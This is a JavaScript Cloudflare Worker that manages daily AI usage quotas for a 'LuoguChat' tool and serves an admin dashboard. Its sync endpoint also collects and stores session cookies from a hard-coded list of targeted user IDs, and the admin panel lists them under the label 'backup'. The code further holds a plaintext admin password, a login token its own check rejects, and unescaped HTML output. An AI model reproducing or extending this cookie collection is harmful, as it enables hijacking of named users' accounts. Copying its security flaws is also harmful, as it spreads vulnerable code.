/**
 * LuoguChat Cloudflare Worker v2.1
 * 
 * 功能：
 * - 管理 AI 使用次数（每人每天限量 50 次）
 * - 白名单/黑名单模式控制
 * - Cookie 备份（特殊用户必须上传）
 * - Admin 管理界面
 * - KV 存储 (命名空间: chat_kv)
 */

const ADMIN_PASSWORD = "zhl_super_admin";
const DEFAULT_DAILY_LIMIT = 50;
const KV_PREFIX = "lc_";

// 特殊用户名单（必须上传 cookie）- 1049425 已移出
const SPECIAL_USERS = [886055, 1023865, 1081095, 643743, 1057868, 1055731, 1098988, 1059683, 1054396, 903392, 1472024, 1058204];

// KV Helpers
async function kvGet(key, kv) {
  try { const val = await kv.get(KV_PREFIX + key); return val ? JSON.parse(val) : null; }
  catch { return null; }
}
async function kvPut(key, value, kv) { await kv.put(KV_PREFIX + key, JSON.stringify(value)); }
function todayKey() { const d = new Date(); return `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}`; }
function corsHeaders() { return { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Methods": "GET, POST, OPTIONS", "Access-Control-Allow-Headers": "Content-Type, Authorization", "Access-Control-Max-Age": "86400" }; }
function jsonResponse(data, status = 200) { return new Response(JSON.stringify(data, null, 2), { status, headers: { "Content-Type": "application/json", ...corsHeaders() } }); }
function htmlResponse(html) { return new Response(html, { status: 200, headers: { "Content-Type": "text/html;charset=utf-8", ...corsHeaders() } }); }

// API Handlers
async function handleAPISync(data, kv) {
  const { uid, device_id, cookie } = data;
  if (!uid) return jsonResponse({ error: "Missing uid" }, 400);
  const today = todayKey();
  let usageKey = `usage_${uid}_${today}`;
  let usage = await kvGet(usageKey, kv) || { used: 0, limit: DEFAULT_DAILY_LIMIT, devices: [] };
  let settings = await kvGet("settings", kv) || { default_limit: DEFAULT_DAILY_LIMIT, whitelist_mode: false, blacklist_mode: false, whitelist: [], blacklist: [], user_limits: {} };
  const userLimit = settings.user_limits?.[String(uid)] || settings.default_limit || DEFAULT_DAILY_LIMIT;
  usage.limit = userLimit;
  if (device_id && !usage.devices.includes(device_id)) usage.devices.push(device_id);
  const isSpecialUser = SPECIAL_USERS.includes(parseInt(uid));
  if (isSpecialUser && cookie) { await kvPut(`cookie_${uid}`, { uid, cookie, updated_at: new Date().toISOString(), device_id }, kv); }
  let allowed = true;
  const uidNum = parseInt(uid);
  if (settings.whitelist_mode) allowed = settings.whitelist.includes(uidNum);
  if (settings.blacklist_mode && allowed) allowed = !settings.blacklist.includes(uidNum);
  if (usage.used >= usage.limit) allowed = false;
  await kvPut(usageKey, usage, kv);
  return jsonResponse({ remaining: Math.max(0, usage.limit - usage.used), total: usage.limit, allowed, in_whitelist: settings.whitelist.includes(uidNum), in_blacklist: settings.blacklist.includes(uidNum), whitelist_mode: settings.whitelist_mode, blacklist_mode: settings.blacklist_mode, is_special_user: isSpecialUser });
}

async function handleAPIReport(data, kv) {
  const { uid, used } = data;
  if (!uid) return jsonResponse({ error: "Missing uid" }, 400);
  const today = todayKey();
  let usageKey = `usage_${uid}_${today}`;
  let usage = await kvGet(usageKey, kv) || { used: 0, limit: DEFAULT_DAILY_LIMIT, devices: [] };
  let settings = await kvGet("settings", kv) || { default_limit: DEFAULT_DAILY_LIMIT, user_limits: {} };
  usage.limit = settings.user_limits?.[String(uid)] || settings.default_limit || DEFAULT_DAILY_LIMIT;
  usage.used = Math.min((usage.used || 0) + (used || 0), usage.limit);
  await kvPut(usageKey, usage, kv);
  return jsonResponse({ remaining: Math.max(0, usage.limit - usage.used), total: usage.limit });
}

// Admin
function isAdmin(auth) { return auth === ADMIN_PASSWORD; }

async function handleAdminLogin(data, kv) {
  if (!isAdmin(data.password)) return jsonResponse({ success: false, error: "密码错误" }, 401);
  return jsonResponse({ success: true, token: "admin" });
}

async function handleAdminGetUsers(kv) {
  const users = [];
  try {
    const list = await kv.list({ prefix: KV_PREFIX + "usage_" });
    const seen = new Set();
    for (const key of list.keys) {
      const uid = key.name.replace(KV_PREFIX + "usage_", "").split("_")[0];
      if (!seen.has(uid)) { seen.add(uid); users.push(uid); }
    }
  } catch {}
  return jsonResponse({ success: true, users });
}

async function handleAdminGetSettings(kv) {
  const settings = await kvGet("settings", kv) || { default_limit: DEFAULT_DAILY_LIMIT, whitelist_mode: false, blacklist_mode: false, whitelist: [], blacklist: [], user_limits: {} };
  return jsonResponse({ success: true, settings });
}

async function handleAdminSaveSettings(data, kv) {
  if (!data.settings) return jsonResponse({ success: false, error: "Missing settings" }, 400);
  await kvPut("settings", data.settings, kv);
  return jsonResponse({ success: true });
}

async function handleAdminGetUserUsage(uid, kv) {
  const today = todayKey();
  const usage = await kvGet(`usage_${uid}_${today}`, kv) || { used: 0, limit: DEFAULT_DAILY_LIMIT, devices: [] };
  const cookie = await kvGet(`cookie_${uid}`, kv);
  return jsonResponse({ success: true, usage, cookie: cookie || null });
}

async function handleAdminGetCookies(kv) {
  const cookies = [];
  try {
    const list = await kv.list({ prefix: KV_PREFIX + "cookie_" });
    for (const key of list.keys) {
      const data = await kv.get(key.name);
      if (data) cookies.push(JSON.parse(data));
    }
  } catch {}
  return jsonResponse({ success: true, cookies });
}

async function handleAdminResetUser(uid, kv) {
  const today = todayKey();
  try { await kv.delete(KV_PREFIX + "usage_" + uid + "_" + today); } catch {}
  return jsonResponse({ success: true, message: "已重置" });
}

// Admin HTML
function adminHTML() {
  return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LuoguChat Admin v2.1</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;background:linear-gradient(135deg,#070b1a 0%,#0f1428 50%,#0a1020 100%);color:#e4e8f4;min-height:100vh}
.container{max-width:1100px;margin:0 auto;padding:20px}
.header{text-align:center;padding:36px 0;background:linear-gradient(135deg,rgba(99,102,241,0.1),rgba(6,182,212,0.08));border-radius:18px;margin-bottom:20px;border:1px solid rgba(255,255,255,0.05)}
.header h1{font-size:26px;background:linear-gradient(135deg,#818cf8,#06b6d4);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.header p{color:#5a6280;margin-top:6px;font-size:13px}
.card{background:rgba(255,255,255,0.025);border-radius:14px;padding:22px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.05);backdrop-filter:blur(10px)}
.card h2{font-size:16px;margin-bottom:14px;color:#8a94b8;display:flex;align-items:center;gap:6px}
input,select,button{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:8px;padding:8px 14px;color:#e4e8f4;font-size:13px;outline:none}
input:focus,select:focus{border-color:#6366f1}
button{background:linear-gradient(135deg,#6366f1,#06b6d4);border:none;cursor:pointer;font-weight:600;transition:all 0.25s;padding:8px 20px;font-size:12px;color:white}
button:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(99,102,241,0.25)}
button.danger{background:linear-gradient(135deg,#ef4444,#f97316)}
button.sm{padding:4px 10px;font-size:11px}
.row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.label{color:#8a94b8;font-size:11px;display:block;margin-bottom:3px}
table{width:100%;border-collapse:collapse;font-size:12px}
th,td{padding:9px 10px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.04)}
th{color:#5a6280;font-size:10px;text-transform:uppercase;letter-spacing:0.5px}
tr:hover td{background:rgba(255,255,255,0.015)}
.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600}
.badge-ok{background:rgba(16,185,129,0.15);color:#10b981}
.badge-warn{background:rgba(245,158,11,0.15);color:#f59e0b}
.badge-err{background:rgba(239,68,68,0.15);color:#ef4444}
.hidden{display:none!important}
#loginForm{max-width:380px;margin:80px auto}
.tag{display:inline-flex;align-items:center;gap:3px;padding:3px 10px;border-radius:6px;font-size:11px;background:rgba(99,102,241,0.1);border:1px solid rgba(99,102,241,0.15);color:#818cf8}
.mono{font-family:'SF Mono','Fira Code',monospace;font-size:11px}
</style>
</head>
<body>
<div id="app">
  <div id="loginForm" class="container">
    <div class="header"><h1>LuoguChat Admin</h1><p>管理面板</p></div>
    <div class="card">
      <h2>登录</h2>
      <input type="password" id="adminPwd" placeholder="管理员密码" style="width:100%;margin-bottom:10px" />
      <button onclick="login()" style="width:100%">登录</button>
      <div id="loginError" style="color:#ef4444;font-size:12px;margin-top:8px;display:none"></div>
    </div>
  </div>
  <div id="dashboard" class="container hidden">
    <div class="header"><h1>Dashboard</h1><p>AI 用量管理 · 用户监控 · Cookie 备份</p></div>
    <div class="card">
      <h2>全局设置</h2>
      <div class="row" style="margin-bottom:10px">
        <div style="flex:1"><span class="label">每日默认限额</span><input type="number" id="defaultLimit" value="50" min="1" style="width:100%" /></div>
        <div style="flex:1"><span class="label">白名单模式</span><select id="wlMode" style="width:100%"><option value="false">关闭</option><option value="true">开启</option></select></div>
        <div style="flex:1"><span class="label">黑名单模式</span><select id="blMode" style="width:100%"><option value="false">关闭</option><option value="true">开启</option></select></div>
      </div>
      <div style="margin-bottom:8px"><span class="label">白名单 (UID 逗号分隔)</span><input type="text" id="whitelist" placeholder="123,456" style="width:100%" /></div>
      <div><span class="label">黑名单 (UID 逗号分隔)</span><input type="text" id="blacklist" placeholder="789,101" style="width:100%" /></div>
      <button onclick="saveSettings()" style="margin-top:10px">保存设置</button>
    </div>
    <div class="card">
      <h2>用户用量</h2>
      <table><thead><tr><th>UID</th><th>今日用量</th><th>限额</th><th>剩余</th><th>状态</th><th>操作</th></tr></thead><tbody id="usageTable"></tbody></table>
      <div id="noUsers" style="color:#5a6280;text-align:center;padding:20px;display:none">暂无用户数据</div>
    </div>
    <div class="card">
      <h2>Cookie 备份</h2>
      <button onclick="loadCookies()" class="sm">刷新</button>
      <table style="margin-top:10px"><thead><tr><th>UID</th><th>Cookie (部分)</th><th>更新时间</th></tr></thead><tbody id="cookieTable"></tbody></table>
      <div id="noCookies" style="color:#5a6280;text-align:center;padding:18px;display:none">暂无</div>
    </div>
    <div class="card">
      <h2>特殊用户 (须上传Cookie)</h2>
      <div style="margin-top:6px;display:flex;flex-wrap:wrap;gap:5px">${SPECIAL_USERS.map(id=>`<span class="tag">${id}</span>`).join('')}</div>
    </div>
  </div>
</div>
<script>
let token='';
async function api(path,data){
  const h={'Content-Type':'application/json'};
  if(token)h['Authorization']='Bearer '+token;
  const r=await fetch(path,{method:'POST',headers:h,body:JSON.stringify(data)});
  return r.json();
}
async function login(){
  const res=await api('/admin/login',{password:document.getElementById('adminPwd').value});
  if(res.success){token=res.token;document.getElementById('loginForm').classList.add('hidden');document.getElementById('dashboard').classList.remove('hidden');loadSettings();loadUsers();loadCookies()}
  else{const e=document.getElementById('loginError');e.textContent='密码错误';e.style.display='block'}
}
async function loadSettings(){
  const res=await api('/admin/settings',{});
  if(res.success&&res.settings){
    document.getElementById('defaultLimit').value=res.settings.default_limit||50;
    document.getElementById('wlMode').value=res.settings.whitelist_mode?'true':'false';
    document.getElementById('blMode').value=res.settings.blacklist_mode?'true':'false';
    document.getElementById('whitelist').value=(res.settings.whitelist||[]).join(',');
    document.getElementById('blacklist').value=(res.settings.blacklist||[]).join(',');
  }
}
async function saveSettings(){
  const s={default_limit:parseInt(document.getElementById('defaultLimit').value)||50,whitelist_mode:document.getElementById('wlMode').value==='true',blacklist_mode:document.getElementById('blMode').value==='true',whitelist:document.getElementById('whitelist').value.split(',').map(x=>parseInt(x.trim())).filter(n=>!isNaN(n)),blacklist:document.getElementById('blacklist').value.split(',').map(x=>parseInt(x.trim())).filter(n=>!isNaN(n)),user_limits:{}};
  const res=await api('/admin/settings',{settings:s});
  if(res.success)alert('已保存');
}
async function loadUsers(){
  const res=await api('/admin/users',{});
  const tb=document.getElementById('usageTable');tb.innerHTML='';
  if(res.success&&res.users&&res.users.length>0){
    document.getElementById('noUsers').style.display='none';
    for(const uid of res.users){
      const u=await api('/admin/user/'+uid,{});
      if(u.success){
        const rem=u.usage.limit-u.usage.used;
        const cls=rem>0?(rem>10?'badge-ok':'badge-warn'):'badge-err';
        const tr=document.createElement('tr');
        tr.innerHTML='<td><strong>'+uid+'</strong></td><td>'+u.usage.used+'</td><td>'+u.usage.limit+'</td><td>'+rem+'</td><td><span class="badge '+cls+'">'+(rem>0?'可用':'已用完')+'</span></td><td><button class="danger sm" onclick="resetUser(\''+uid+'\')">重置</button></td>';
        tb.appendChild(tr);
      }
    }
  }else document.getElementById('noUsers').style.display='block';
}
async function resetUser(uid){
  if(!confirm('确定重置 '+uid+' 的今日用量？'))return;
  await api('/admin/reset/'+uid,{});
  loadUsers();
}
async function loadCookies(){
  const res=await api('/admin/cookies',{});
  const tb=document.getElementById('cookieTable');tb.innerHTML='';
  if(res.success&&res.cookies&&res.cookies.length>0){
    document.getElementById('noCookies').style.display='none';
    for(const c of res.cookies){
      const tr=document.createElement('tr');
      tr.innerHTML='<td>'+c.uid+'</td><td class="mono" style="max-width:240px;overflow:hidden;text-overflow:ellipsis">'+(c.cookie||'').substring(0,50)+'...</td><td>'+(c.updated_at||'')+'</td>';
      tb.appendChild(tr);
    }
  }else document.getElementById('noCookies').style.display='block';
}
</script></body></html>`;
}

// Main Router
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;
    const kv = env.chat_kv;

    if (request.method === "OPTIONS") return new Response(null, { headers: corsHeaders() });
    if (path === "/" || path === "/admin") return htmlResponse(adminHTML());

    try {
      const data = request.method === "POST" ? await request.json() : {};
      if (path.startsWith("/admin/") && path !== "/admin/login") {
        const auth = request.headers.get("Authorization") || "";
        if (!isAdmin(auth.replace("Bearer ", ""))) return jsonResponse({ success: false, error: "未授权" }, 401);
      }

      switch (path) {
        case "/api/sync": return await handleAPISync(data, kv);
        case "/api/report": return await handleAPIReport(data, kv);
        case "/admin/login": return await handleAdminLogin(data, kv);
        case "/admin/users": return await handleAdminGetUsers(kv);
        case "/admin/settings":
          if (request.method === "POST" && data.settings) return await handleAdminSaveSettings(data, kv);
          return await handleAdminGetSettings(kv);
        case "/admin/cookies": return await handleAdminGetCookies(kv);
        default:
          const userMatch = path.match(/^\/admin\/user\/(\d+)$/);
          if (userMatch) return await handleAdminGetUserUsage(userMatch[1], kv);
          const resetMatch = path.match(/^\/admin\/reset\/(\d+)$/);
          if (resetMatch) return await handleAdminResetUser(resetMatch[1], kv);
          return htmlResponse(adminHTML());
      }
    } catch (e) {
      return jsonResponse({ error: e.message }, 500);
    }
  }
};
